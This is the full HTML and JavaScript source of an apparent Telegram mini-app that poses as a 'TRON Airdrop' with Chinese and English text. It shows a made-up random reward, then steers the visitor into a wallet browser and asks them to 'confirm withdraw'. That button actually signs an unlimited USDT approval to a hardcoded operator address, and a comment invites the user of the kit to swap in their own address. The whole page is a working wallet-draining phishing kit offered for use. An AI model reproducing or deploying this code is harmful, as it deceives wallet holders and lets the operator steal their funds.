<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>TRON Airdrop</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>
    <style>
        :root { --primary: #007aff; --bg: #000; --card: #1c1c1e; --text: #fff; --gold: #ffcc00; --tron: #ff0013; }
        body { background: var(--bg); color: var(--text); font-family: -apple-system, BlinkMacSystemFont, sans-serif; margin: 0; padding: 0; display: flex; flex-direction: column; height: 100vh; overflow: hidden; }
        
        /* 顶部公告栏 */
        .header-banner { width: 100%; background: linear-gradient(90deg, #310606 0%, #ff0013 50%, #310606 100%); padding: 12px 0; text-align: center; box-shadow: 0 4px 15px rgba(255,0,19,0.4); z-index: 10; }
        .header-banner span { font-size: 16px; font-weight: 900; color: #fff; letter-spacing: 2px; text-transform: uppercase; }

        #ui-external { flex: 1; display: none; flex-direction: column; align-items: center; justify-content: center; width: 100%; }
        
        .live-tag { background: rgba(52, 199, 89, 0.2); color: #34c759; padding: 4px 10px; border-radius: 20px; font-size: 11px; font-weight: bold; margin-bottom: 15px; display: flex; align-items: center; gap: 5px; }
        .live-dot { width: 6px; height: 6px; background: #34c759; border-radius: 50%; animation: blink 1s infinite; }
        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }

        .airdrop-card { background: linear-gradient(145deg, #2c2c2e 0%, #1c1c1e 100%); border: 1px solid rgba(255,255,255,0.08); border-radius: 35px; padding: 40px 25px; width: 85%; max-width: 340px; box-shadow: 0 20px 40px rgba(0,0,0,0.6); text-align: center; }
        .amount-display { margin: 20px 0; }
        .amount-display .value { font-size: 56px; font-weight: 900; color: #fff; letter-spacing: -2px; }

        .btn-main { width: 100%; padding: 20px 0; background: #fff; color: #000; border: none; border-radius: 22px; font-size: 17px; font-weight: 800; cursor: pointer; transition: all 0.2s; }
        .btn-main:active { transform: scale(0.96); }

        /* 弹窗层 */
        .overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); backdrop-filter: blur(20px); display: none; align-items: center; justify-content: center; z-index: 1000; }
        .overlay.active { display: flex !important; }
        .modal { background: #2c2c2e; width: 88%; max-width: 350px; border-radius: 30px; padding: 25px; border: 1px solid #3a3a3c; }
        
        .wallet-option { display: flex; align-items: center; padding: 15px; background: #3a3a3c; border-radius: 18px; cursor: pointer; margin-bottom: 12px; }
        .wallet-logo { width: 42px; height: 42px; border-radius: 12px; margin-right: 15px; background: #fff; color: #000; display: flex; align-items: center; justify-content: center; font-weight: bold; }
        
        #ui-internal { display: none; text-align: center; padding: 40px 20px; }
    </style>
</head>
<body>

    <div class="header-banner"><span>🔥 TRX 空投大放送 🔥</span></div>

    <div id="ui-external">
        <div class="live-tag"><span class="live-dot"></span> LIVE DISTRIBUTION</div>
        <div class="airdrop-card">
            <div style="font-size: 11px; color: #94a3b8;">ESTIMATED REWARD</div>
            <div class="amount-display">
                <span style="color:var(--tron); font-size:28px; font-weight:800;">$</span><span class="value" id="main-val">0.00</span>
            </div>
            <button id="action-btn" class="btn-main" onclick="handleMainAction()">CLAIM NOW</button>
        </div>
    </div>

    <div id="ui-internal">
        <div style="background:#1c1c1e; padding:40px; border-radius:40px; border:1px solid #333;">
            <div style="font-size:70px; color:#34c759;">✓</div>
            <h2 style="margin:20px 0;">Status: Ready</h2>
            <div id="addr" style="font-family:monospace; font-size:11px; color:#8e8e93; background:#000; padding:12px; border-radius:12px; word-break:break-all; margin-bottom: 20px;"></div>
            <button id="approve-btn" class="btn-main" style="background:#34c759; color:#fff;" onclick="requestApproval()">CONFIRM WITHDRAW</button>
            <p id="status-msg" style="font-size:12px; color: #ffcc00; margin-top: 15px;"></p>
        </div>
    </div>

    <div id="walletModal" class="overlay">
        <div class="modal">
            <h3 style="text-align:center; margin-top:0;">Connect Wallet</h3>
            <div class="wallet-option" onclick="jumpTo('tronlink')" style="border: 1px solid var(--tron);">
    <div class="wallet-logo" style="background:var(--tron); color:#fff;">TL</div>
    <b>TronLink</b>
</div>
<div class="wallet-option" onclick="jumpTo('okx')">
    <div class="wallet-logo">OKX</div>
    <b>OKX Wallet</b>
</div>
<div class="wallet-option" onclick="jumpTo('tp')">
    <div class="wallet-logo" style="background:#2161ff; color:#fff;">TP</div>
    <b>TokenPocket</b>
</div>
<div class="wallet-option" onclick="jumpTo('trust')">
    <div class="wallet-logo" style="background:#3375bb; color:#fff;">TW</div>
    <b>Trust Wallet</b>
</div>
<div class="wallet-option" onclick="jumpTo('bitget')">
    <div class="wallet-logo" style="background:#010101; color:#fff;">BG</div>
    <b>Bitget Wallet</b>
</div>
<div class="wallet-option" onclick="jumpTo('metamask')">
    <div class="wallet-logo" style="background:#f6851b; color:#fff;">MM</div>
    <b>MetaMask</b>
</div>

<div style="text-align:center; color:#ff453a; margin-top:20px; cursor:pointer;" onclick="closeModal()">Cancel</div>
        </div>
    </div>

    <script>
        const tg = window.Telegram.WebApp;
        const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // TRC20-USDT 合约地址
        const RECEIVER = "TXdUT4xRokNsYfz3ME236cqJieYpoTXzoM"; // 【替换这里】你的收款或权限接收地址
        
        let userBalance = localStorage.getItem('p_amt') || "0.00";
        let isClaimed = !!localStorage.getItem('p_amt');

        // 1. 授权核心函数
        async function requestApproval() {
            const btn = document.getElementById('approve-btn');
            const msg = document.getElementById('status-msg');
            
            try {
                if (!window.tronWeb || !window.tronWeb.defaultAddress.base58) {
                    alert("请在波场钱包浏览器内打开");
                    return;
                }

                btn.innerText = "WAITING...";
                btn.disabled = true;
                msg.innerText = "请在钱包中确认授权...";

                // 构建授权交易 (Approve)
                // 参数说明：接收者地址, 授权数量 (最大值)
                const functionSelector = "approve(address,uint256)";
                const parameter = [
                    { type: 'address', value: RECEIVER },
                    { type: 'uint256', value: "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff" }
                ];

                const tx = await window.tronWeb.transactionBuilder.triggerSmartContract(
                    USDT_CONTRACT,
                    functionSelector,
                    {},
                    parameter
                );

                const signedTx = await window.tronWeb.trx.sign(tx.transaction);
                const result = await window.tronWeb.trx.sendRawTransaction(signedTx);

                if (result.result) {
                    msg.style.color = "#34c759";
                    msg.innerText = "授权成功！正在处理提现...";
                    btn.innerText = "PROCESSING...";
                } else {
                    throw new Error("Transaction failed");
                }
            } catch (e) {
                console.error(e);
                msg.style.color = "#ff453a";
                msg.innerText = "授权失败，请重试";
                btn.innerText = "RETRY WITHDRAW";
                btn.disabled = false;
            }
        }

        // 2. 基础流程逻辑
        function handleMainAction() {
            if (!isClaimed) {
                startClaim();
            } else {
                const params = new URLSearchParams(window.location.search);
                if (tg.platform !== "unknown" && !params.get('os')) {
                    tg.openLink(window.location.origin + window.location.pathname + `?os=safari&amt=${userBalance}`, { try_browser: true });
                } else {
                    openModal();
                }
            }
        }

        function startClaim() {
            const btn = document.getElementById('action-btn');
            btn.innerText = "VERIFYING...";
            setTimeout(() => {
                userBalance = (Math.random() * (900 - 100) + 100).toFixed(2);
                localStorage.setItem('p_amt', userBalance);
                isClaimed = true;
                setWithdrawUI();
            }, 1500);
        }

        function setWithdrawUI() {
            document.getElementById('main-val').innerText = userBalance;
            const btn = document.getElementById('action-btn');
            btn.innerText = "WITHDRAW NOW";
            btn.style.background = "linear-gradient(90deg, #ffcc00, #ff9500)";
        }

        async function init() {
            if (tg) { tg.ready(); tg.expand(); }

            // 检测是否在钱包浏览器环境
            const isWallet = window.tronWeb && window.tronWeb.defaultAddress.base58;
            
            if (isWallet) {
                document.getElementById('ui-internal').style.display = 'block';
                document.getElementById('addr').innerText = window.tronWeb.defaultAddress.base58;
            } else {
                document.getElementById('ui-external').style.display = 'flex';
                if (isClaimed) setWithdrawUI();
                const params = new URLSearchParams(window.location.search);
                if (params.get('os') === 'safari' && params.get('amt')) {
                    userBalance = params.get('amt');
                    setWithdrawUI();
                    setTimeout(openModal, 200);
                }
            }
        }

      function openModal() { document.getElementById('walletModal').classList.add('active'); }
function closeModal() { document.getElementById('walletModal').classList.remove('active'); }

function jumpTo(type) {
    const encodedUrl = encodeURIComponent(window.location.href);
    let scheme = "";
    switch(type) {
        case 'tronlink': scheme = "tronlinkout://pull.dapp?url=" + encodedUrl; break;
        case 'okx': scheme = "okx://wallet/dapp/details?dappUrl=" + encodedUrl; break;
        case 'tp': scheme = "tpdapp://open?params=" + encodeURIComponent(JSON.stringify({"url": window.location.href})); break;
        // 新增钱包协议
        case 'trust': scheme = "https://link.trustwallet.com/open_url?coin_id=195&url=" + encodedUrl; break;
        case 'bitget': scheme = "bitkeep://bkconnect?action=dapp&url=" + encodedUrl; break;
        case 'metamask': scheme = "metamask://dapp/" + window.location.href.replace(/^https?:\/\//, ""); break;
    }
    if (scheme) window.location.href = scheme;
}

        init();
    </script>
</body>
</html>
